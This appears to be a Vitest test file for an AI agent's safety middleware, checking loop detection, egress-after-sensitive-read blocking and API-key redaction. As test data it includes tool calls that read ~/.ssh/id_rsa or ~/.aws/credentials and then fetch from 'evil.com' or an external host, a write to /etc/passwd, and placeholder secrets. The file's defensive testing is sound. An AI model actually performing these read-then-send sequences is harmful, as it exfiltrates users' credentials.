import { beforeEach, describe, expect, it } from "vitest";
import {
	SafetyMiddleware,
	createSafetyMiddleware,
} from "../../src/safety/safety-middleware.js";

// Split tokens to avoid triggering secret scanners in the repo.
const joinParts = (...parts: string[]) => parts.join("");
const SAMPLE_AWS_ACCESS_KEY = joinParts("AK", "IA", "IOSFODNN7", "EXAMPLE");
const SAMPLE_ANTHROPIC_KEY = joinParts(
	"sk",
	"-",
	"ant",
	"-",
	"api03",
	"-",
	"secret-key-here",
);
const SAMPLE_ANTHROPIC_SHORT = joinParts(
	"sk",
	"-",
	"ant",
	"-",
	"api03",
	"-",
	"secret",
);
const SAMPLE_ANTHROPIC_LONG = joinParts(
	"sk",
	"-",
	"ant",
	"-",
	"api03",
	"-",
	"actual-secret-key-value",
);
const SAMPLE_ANTHROPIC_COMPLEX = joinParts(
	"sk",
	"-",
	"ant",
	"-",
	"api03",
	"-",
	"abcdefghij1234567890",
	"-",
	"secretkey",
);

describe("safety-middleware", () => {
	let middleware: SafetyMiddleware;

	beforeEach(() => {
		middleware = new SafetyMiddleware({
			loopDetector: {
				maxIdenticalCalls: 3,
				maxSimilarCalls: 5,
				autoPause: false,
			},
			sequenceAnalyzer: {
				maxRecords: 50,
				maxAgeMs: 60000,
			},
			contextFirewall: {
				redactSecrets: true,
				blockHighSeverity: false,
			},
		});
	});

	describe("preExecution", () => {
		it("allows normal tool calls", () => {
			const result = middleware.preExecution("read", { path: "/tmp/test.txt" });
			expect(result.allowed).toBe(true);
			expect(result.requiresApproval).toBe(false);
		});

		it("returns sanitized arguments", () => {
			const result = middleware.preExecution("read", {
				path: "/tmp/test.txt",
				token: SAMPLE_ANTHROPIC_KEY,
			});
			expect(result.allowed).toBe(true);
			expect(result.sanitizedArgs.path).toBe("/tmp/test.txt");
			expect(result.sanitizedArgs.token).toContain("[REDACTED");
		});

		it("provides details about checks performed", () => {
			const result = middleware.preExecution("read", { path: "/tmp/test.txt" });
			expect(result.details).toBeDefined();
			expect(result.details?.loopResult).toBeDefined();
			expect(result.details?.sequenceResult).toBeDefined();
		});
	});

	describe("loop detection integration", () => {
		it("detects exact repetition loops", () => {
			// Create middleware with autoPause enabled for blocking behavior
			const blockingMiddleware = new SafetyMiddleware({
				loopDetector: {
					maxIdenticalCalls: 3,
					autoPause: true, // Enable blocking on loop detection
				},
			});

			const args = { path: "/tmp/same.txt" };

			// First few calls should be fine
			blockingMiddleware.postExecution("read", args, true);
			blockingMiddleware.postExecution("read", args, true);
			blockingMiddleware.postExecution("read", args, true);

			// Fourth call should trigger
			const result = blockingMiddleware.preExecution("read", args);
			expect(result.allowed).toBe(false);
			expect(result.triggeredBy).toBe("loop");
			expect(result.details?.loopResult?.type).toBe("exact");
		});

		it("allows varied operations", () => {
			middleware.postExecution("read", { path: "/tmp/a.txt" }, true);
			middleware.postExecution("write", { path: "/tmp/b.txt" }, true);
			middleware.postExecution("read", { path: "/tmp/c.txt" }, true);

			const result = middleware.preExecution("delete", { path: "/tmp/d.txt" });
			expect(result.allowed).toBe(true);
		});
	});

	describe("sequence analysis integration", () => {
		it("detects read-then-egress pattern", () => {
			// Record a sensitive file read
			middleware.postExecution(
				"read",
				{ path: "/home/user/.ssh/id_rsa" },
				true,
			);

			// Egress should require approval
			const result = middleware.preExecution("web_fetch", {
				url: "https://evil.com",
			});
			expect(result.allowed).toBe(false);
			expect(result.requiresApproval).toBe(true);
			expect(result.triggeredBy).toBe("sequence");
		});

		it("allows egress without prior sensitive reads", () => {
			middleware.postExecution("read", { path: "/tmp/readme.txt" }, true);

			const result = middleware.preExecution("web_fetch", {
				url: "https://api.example.com",
			});
			expect(result.allowed).toBe(true);
		});

		it("detects system path escalation", () => {
			const result = middleware.preExecution("write", { path: "/etc/passwd" });
			expect(result.allowed).toBe(false);
			expect(result.requiresApproval).toBe(true);
			expect(result.triggeredBy).toBe("sequence");
		});
	});

	describe("context firewall integration", () => {
		it("sanitizes API keys in arguments", () => {
			const result = middleware.preExecution("bash", {
				command: `curl -H 'Authorization: Bearer ${SAMPLE_ANTHROPIC_SHORT}'`,
			});
			expect(result.sanitizedArgs.command).toContain("[REDACTED");
		});

		it("sanitizes AWS credentials", () => {
			const result = middleware.preExecution("write", {
				content: `AWS_ACCESS_KEY_ID=${SAMPLE_AWS_ACCESS_KEY}`,
			});
			expect(result.sanitizedArgs.content).toContain("[REDACTED");
		});

		it("can block high-severity content when configured", () => {
			const strictMiddleware = new SafetyMiddleware({
				contextFirewall: {
					blockHighSeverity: true,
				},
			});

			const result = strictMiddleware.preExecution("bash", {
				command: `export API_KEY=${SAMPLE_ANTHROPIC_LONG}`,
			});
			// High severity blocking depends on the specific patterns detected
			// The middleware should at least sanitize the content
			expect(result.sanitizedArgs.command).not.toBe(
				`export API_KEY=${SAMPLE_ANTHROPIC_LONG}`,
			);
		});
	});

	describe("postExecution", () => {
		it("records successful executions", () => {
			middleware.postExecution("read", { path: "/tmp/test.txt" }, true);
			const stats = middleware.getStats();
			expect(stats.loopDetector.totalRecords).toBe(1);
			expect(stats.sequenceAnalyzer.totalCalls).toBe(1);
		});

		it("records failed executions", () => {
			middleware.postExecution("read", { path: "/tmp/test.txt" }, false);
			const stats = middleware.getStats();
			expect(stats.loopDetector.totalRecords).toBe(1);
		});
	});

	describe("sanitizeForLogging", () => {
		it("removes secrets from arbitrary data", () => {
			const data = {
				user: "admin",
				password: "secret123",
				apiKey: SAMPLE_ANTHROPIC_KEY,
			};
			const sanitized = middleware.sanitizeForLogging(data);
			expect(sanitized.user).toBe("admin");
			expect(sanitized.apiKey).toContain("[REDACTED");
		});
	});

	describe("state management", () => {
		it("resets all internal state", () => {
			middleware.postExecution("read", { path: "/tmp/a.txt" }, true);
			middleware.postExecution("read", { path: "/tmp/b.txt" }, true);

			middleware.reset();

			const stats = middleware.getStats();
			expect(stats.loopDetector.totalRecords).toBe(0);
			expect(stats.sequenceAnalyzer.totalCalls).toBe(0);
		});

		it("tracks pause state from loop detector", () => {
			expect(middleware.isLoopDetectorPaused()).toBe(false);
			expect(middleware.getLoopPauseReason()).toBeUndefined();
		});
	});

	describe("configuration options", () => {
		it("can disable loop detection", () => {
			const noLoopMiddleware = new SafetyMiddleware({
				enableLoopDetection: false,
			});

			// Record many identical calls
			for (let i = 0; i < 10; i++) {
				noLoopMiddleware.postExecution("read", { path: "/same.txt" }, true);
			}

			// Should still allow (loop detection disabled)
			const result = noLoopMiddleware.preExecution("read", {
				path: "/same.txt",
			});
			expect(result.allowed).toBe(true);
			expect(result.details?.loopResult).toBeUndefined();
		});

		it("can disable sequence analysis", () => {
			const noSequenceMiddleware = new SafetyMiddleware({
				enableSequenceAnalysis: false,
			});

			noSequenceMiddleware.postExecution("read", { path: "/etc/passwd" }, true);

			// Egress should be allowed (sequence analysis disabled)
			const result = noSequenceMiddleware.preExecution("web_fetch", {
				url: "https://evil.com",
			});
			// May still be blocked by other checks, but sequence won't be the trigger
			expect(result.details?.sequenceResult).toBeUndefined();
		});

		it("can disable context firewall", () => {
			const noFirewallMiddleware = new SafetyMiddleware({
				enableContextFirewall: false,
			});

			const result = noFirewallMiddleware.preExecution("bash", {
				command: `export API_KEY=${SAMPLE_ANTHROPIC_SHORT}`,
			});

			// Args should not be sanitized
			expect(result.sanitizedArgs.command).toBe(
				`export API_KEY=${SAMPLE_ANTHROPIC_SHORT}`,
			);
		});
	});

	describe("createSafetyMiddleware factory", () => {
		it("creates middleware with default config", () => {
			const mw = createSafetyMiddleware();
			expect(mw).toBeInstanceOf(SafetyMiddleware);
		});

		it("creates middleware with custom config", () => {
			const mw = createSafetyMiddleware({
				loopDetector: { maxIdenticalCalls: 10 },
			});

			// Record 5 identical calls (below threshold)
			for (let i = 0; i < 5; i++) {
				mw.postExecution("read", { path: "/same.txt" }, true);
			}

			const result = mw.preExecution("read", { path: "/same.txt" });
			expect(result.allowed).toBe(true);
		});
	});

	describe("combined safety checks", () => {
		it("prioritizes firewall over loop detection", () => {
			// Even if not a loop, firewall should sanitize
			const result = middleware.preExecution("read", {
				path: "/tmp/test.txt",
				secret: SAMPLE_AWS_ACCESS_KEY,
			});
			expect(result.sanitizedArgs.secret).toContain("[REDACTED");
		});

		it("checks all safety layers in order", () => {
			// This tests the full flow: firewall → loop → sequence
			middleware.postExecution(
				"read",
				{ path: "/home/user/.aws/credentials" },
				true,
			);

			const result = middleware.preExecution("curl", {
				url: "https://external.com",
				// Use a realistic-length API key to match the detection pattern
				auth: SAMPLE_ANTHROPIC_COMPLEX,
			});

			// Should detect sequence pattern AND sanitize args
			expect(result.allowed).toBe(false);
			expect(result.triggeredBy).toBe("sequence");
			expect(result.sanitizedArgs.auth).toContain("[REDACTED");
		});
	});
});
